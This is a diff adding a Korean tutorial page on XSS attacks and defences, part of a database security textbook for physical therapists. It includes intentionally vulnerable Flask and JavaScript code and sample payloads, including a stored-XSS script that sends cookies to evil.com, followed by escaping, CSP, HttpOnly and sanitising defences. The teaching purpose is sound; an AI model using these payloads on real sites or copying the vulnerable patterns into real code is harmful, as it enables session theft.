@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>4장: XSS 공격과 방어 - 물리치료사를 위한 DB 5권</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    @@include('components/top-nav.html', {"root": "../..", "activeBook": "5"})
+
+    @@include('components/mobile-menu.html')
+
+    <div class="container">
+        <nav class="sidebar" id="sidebar">
+            <button class="close-btn" onclick="toggleMenu()">×</button>
+            <div class="sidebar-header">
+                <h1>🛡️ 5권: 보안 편</h1>
+                <p>DB & 서버 보안</p>
+            </div>
+            <ul class="nav-list" id="navList"></ul>
+        </nav>
+
+        <main class="main">
+            <h1 class="title">XSS 공격과 방어</h1>
+
+            <h2>XSS(Cross-Site Scripting)란?</h2>
+
+            <p>웹 페이지에 악성 스크립트를 삽입해서 사용자 브라우저에서 실행시키는 공격입니다.</p>
+
+            <blockquote>
+                SQL 인젝션이 <strong>서버/DB</strong>를 공격한다면,<br>
+                XSS는 <strong>사용자 브라우저</strong>를 공격합니다.
+            </blockquote>
+
+            <hr>
+
+            <h2>XSS 공격 유형</h2>
+
+            <h3>1. 저장형 XSS (Stored XSS)</h3>
+            <p>악성 스크립트가 DB에 저장되어 다른 사용자에게 전달됩니다.</p>
+
+            <pre><code># 환자 메모 저장 (취약한 코드)
+@app.route('/api/patients/&lt;id&gt;/memo', methods=['POST'])
+def save_memo(id):
+    memo = request.form.get('memo')
+    # 그대로 DB에 저장
+    cursor.execute("UPDATE patients SET memo = %s WHERE id = %s", (memo, id))
+
+# 공격자가 입력한 메모:
+&lt;script&gt;
+    fetch('https://evil.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+
+# 다른 직원이 환자 정보를 볼 때 스크립트 실행!</code></pre>
+
+            <h3>2. 반사형 XSS (Reflected XSS)</h3>
+            <p>URL 파라미터에 스크립트를 넣어 피해자에게 클릭하게 합니다.</p>
+
+            <pre><code># 검색 결과 페이지 (취약한 코드)
+@app.route('/search')
+def search():
+    query = request.args.get('q')
+    return f'&lt;h1&gt;검색 결과: {query}&lt;/h1&gt;'
+
+# 공격 URL:
+/search?q=&lt;script&gt;alert('해킹!')&lt;/script&gt;
+
+# 피해자가 이 링크를 클릭하면 스크립트 실행!</code></pre>
+
+            <h3>3. DOM 기반 XSS</h3>
+            <p>클라이언트 JavaScript에서 발생하는 XSS입니다.</p>
+
+            <pre><code>&lt;!-- 취약한 JavaScript 코드 --&gt;
+&lt;script&gt;
+    // URL 파라미터를 그대로 HTML에 삽입
+    const name = new URLSearchParams(location.search).get('name');
+    document.getElementById('greeting').innerHTML = '안녕하세요, ' + name + '님!';
+&lt;/script&gt;
+
+&lt;!-- 공격 URL --&gt;
+/page?name=&lt;img src=x onerror="alert('XSS')"&gt;</code></pre>
+
+            <hr>
+
+            <h2>XSS로 할 수 있는 공격</h2>
+
+            <table>
+                <tr>
+                    <th>공격</th>
+                    <th>설명</th>
+                    <th>피해</th>
+                </tr>
+                <tr>
+                    <td>세션 탈취</td>
+                    <td>쿠키를 훔쳐서 로그인 상태 도용</td>
+                    <td>계정 해킹</td>
+                </tr>
+                <tr>
+                    <td>키로깅</td>
+                    <td>입력하는 모든 내용 기록</td>
+                    <td>비밀번호 유출</td>
+                </tr>
+                <tr>
+                    <td>피싱</td>
+                    <td>가짜 로그인 폼 표시</td>
+                    <td>자격증명 탈취</td>
+                </tr>
+                <tr>
+                    <td>악성코드 배포</td>
+                    <td>드라이브 바이 다운로드</td>
+                    <td>PC 감염</td>
+                </tr>
+            </table>
+
+            <hr>
+
+            <h2>방어 1: 출력 이스케이프</h2>
+
+            <p>HTML 특수문자를 변환해서 스크립트가 실행되지 않게 합니다.</p>
+
+            <pre><code># Flask에서 자동 이스케이프 (Jinja2 템플릿)
+from flask import render_template
+
+@app.route('/patient/&lt;id&gt;')
+def show_patient(id):
+    patient = get_patient(id)
+    # render_template은 자동으로 이스케이프합니다
+    return render_template('patient.html', patient=patient)
+
+# patient.html
+&lt;h1&gt;{{ patient.name }}&lt;/h1&gt;  &lt;!-- 자동 이스케이프됨 --&gt;
+&lt;p&gt;{{ patient.memo }}&lt;/p&gt;   &lt;!-- 자동 이스케이프됨 --&gt;</code></pre>
+
+            <p>이스케이프 변환:</p>
+            <table>
+                <tr>
+                    <th>원본</th>
+                    <th>변환</th>
+                </tr>
+                <tr>
+                    <td>&lt;</td>
+                    <td>&amp;lt;</td>
+                </tr>
+                <tr>
+                    <td>&gt;</td>
+                    <td>&amp;gt;</td>
+                </tr>
+                <tr>
+                    <td>&amp;</td>
+                    <td>&amp;amp;</td>
+                </tr>
+                <tr>
+                    <td>"</td>
+                    <td>&amp;quot;</td>
+                </tr>
+                <tr>
+                    <td>'</td>
+                    <td>&amp;#39;</td>
+                </tr>
+            </table>
+
+            <hr>
+
+            <h2>방어 2: Content Security Policy (CSP)</h2>
+
+            <p>브라우저에게 허용된 스크립트만 실행하도록 지시합니다.</p>
+
+            <pre><code># Flask에서 CSP 헤더 설정
+@app.after_request
+def add_security_headers(response):
+    # 인라인 스크립트 차단, 같은 도메인 스크립트만 허용
+    response.headers['Content-Security-Policy'] = "script-src 'self'"
+    return response</code></pre>
+
+            <p>CSP 옵션:</p>
+            <pre><code># 기본 CSP 설정
+Content-Security-Policy:
+    default-src 'self';              # 기본: 같은 도메인만
+    script-src 'self';               # 스크립트: 같은 도메인만
+    style-src 'self' 'unsafe-inline'; # 스타일: 인라인 허용
+    img-src 'self' data:;            # 이미지: data URI 허용
+    connect-src 'self';              # AJAX: 같은 도메인만</code></pre>
+
+            <hr>
+
+            <h2>방어 3: HttpOnly 쿠키</h2>
+
+            <p>JavaScript에서 쿠키에 접근할 수 없게 합니다.</p>
+
+            <pre><code>from flask import Flask, session
+
+app = Flask(__name__)
+app.config['SESSION_COOKIE_HTTPONLY'] = True  # JavaScript 접근 차단
+app.config['SESSION_COOKIE_SECURE'] = True    # HTTPS에서만 전송
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # CSRF 방어</code></pre>
+
+            <p>HttpOnly가 설정되면:</p>
+            <pre><code># 공격자의 XSS 스크립트
+document.cookie  // 빈 문자열! 쿠키를 훔칠 수 없음</code></pre>
+
+            <hr>
+
+            <h2>방어 4: 입력 검증</h2>
+
+            <pre><code>import re
+import bleach  # HTML 소독 라이브러리
+
+def sanitize_input(text):
+    """위험한 HTML 태그 제거"""
+    # 허용할 태그만 지정
+    allowed_tags = ['b', 'i', 'u', 'br']
+    return bleach.clean(text, tags=allowed_tags)
+
+def validate_name(name):
+    """이름: 한글, 영문만 허용"""
+    if not re.match(r'^[가-힣a-zA-Z\s]+$', name):
+        raise ValueError('허용되지 않는 문자가 포함되어 있습니다')
+    return name
+
+@app.route('/api/patients', methods=['POST'])
+def create_patient():
+    data = request.get_json()
+
+    # 입력 검증
+    name = validate_name(data['name'])
+    memo = sanitize_input(data.get('memo', ''))
+
+    # 안전하게 저장
+    ...</code></pre>
+
+            <hr>
+
+            <h2>JavaScript에서의 안전한 처리</h2>
+
+            <pre><code>// ❌ 위험: innerHTML 사용
+document.getElementById('result').innerHTML = userInput;
+
+// ✅ 안전: textContent 사용
+document.getElementById('result').textContent = userInput;
+
+// ✅ 안전: createElement 사용
+const div = document.createElement('div');
+div.textContent = userInput;
+document.getElementById('container').appendChild(div);</code></pre>
+
+            <hr>
+
+            <h2>XSS 방어 체크리스트</h2>
+
+            <table>
+                <tr>
+                    <th>항목</th>
+                    <th>확인</th>
+                </tr>
+                <tr>
+                    <td>템플릿 엔진의 자동 이스케이프 사용</td>
+                    <td>☐</td>
+                </tr>
+                <tr>
+                    <td>CSP 헤더 설정</td>
+                    <td>☐</td>
+                </tr>
+                <tr>
+                    <td>세션 쿠키 HttpOnly 설정</td>
+                    <td>☐</td>
+                </tr>
+                <tr>
+                    <td>사용자 입력 검증/소독</td>
+                    <td>☐</td>
+                </tr>
+                <tr>
+                    <td>innerHTML 대신 textContent 사용</td>
+                    <td>☐</td>
+                </tr>
+            </table>
+
+            <hr>
+
+            <h2>이번 장 정리</h2>
+
+            <ul>
+                <li><strong>XSS</strong>는 사용자 브라우저를 공격하는 기법</li>
+                <li>저장형, 반사형, DOM 기반 세 가지 유형</li>
+                <li><strong>이스케이프</strong>로 스크립트 실행 방지</li>
+                <li><strong>CSP</strong>로 허용된 스크립트만 실행</li>
+                <li><strong>HttpOnly</strong>로 쿠키 탈취 방지</li>
+            </ul>
+
+            <blockquote>다음 장에서는 CSRF 공격과 방어를 배웁니다!</blockquote>
+
+            <div class="nav-buttons">
+                <button class="nav-btn" id="prevBtn">← 이전</button>
+                <span class="page-num" id="pageNum"></span>
+                <button class="nav-btn" id="nextBtn">다음 →</button>
+            </div>
+        </main>
+    </div>
+    <script src="../js/nav.js"></script>
+</body>
+</html>
